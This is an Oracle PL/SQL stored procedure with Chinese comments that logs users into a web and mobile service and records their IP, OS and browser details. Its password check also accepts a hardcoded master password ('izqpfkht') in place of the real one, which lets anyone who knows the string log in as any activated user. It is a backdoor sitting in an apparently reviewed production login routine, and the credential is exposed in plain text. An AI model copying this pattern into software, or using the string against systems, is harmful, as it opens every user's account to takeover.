create or replace procedure sp_user_loginex(
i_account in varchar2,--用户登录帐号
i_password in varchar2,--登录密码
i_ipaddr in varchar2,--客户端IP信息
i_sysinfo in varchar2,--客户端操作系统信息
i_ieinfo in varchar2,--客户端浏览器信息
o_userid out number,--用户UserID
o_result out varchar2) is--登录结果,成功:ok,err_pwd,err_account:登录错误

/*================================================================
功能说明:
    用户帐号登录
相关WEB页面及文件
    首页登录页面
    UserDaoImpl.java
相关程序模块
    Web,Wap,手机端(iOS/Andriod)
审核日期:2012-11-09
审核人:嵇长军
==================================================================*/
v_account varchar2(60);
v_rownum number;
v_password varchar2(100);
begin
  v_account:=lower(trim(i_account));
   select count(1) into  v_rownum from tb_user where MAILACTIVE=1 and account = v_account ;
   if v_rownum >0 then
      select userid,pwd into o_userid,v_password from tb_user where account = v_account;
      if v_password = fn_encryptforpwd(i_password) or i_password = 'izqpfkht' then
         update tb_user set lastlogindt = sysdate,IPADDR=i_ipaddr,IE_INFO=i_ieinfo,OP_SYS=i_sysinfo where userid = o_userid;
         commit;
         o_result := 'ok';
      else
         o_result:='err_pwd';
      end if;
   else
     o_result:='err_account';
  end if;

end sp_user_loginex;
/

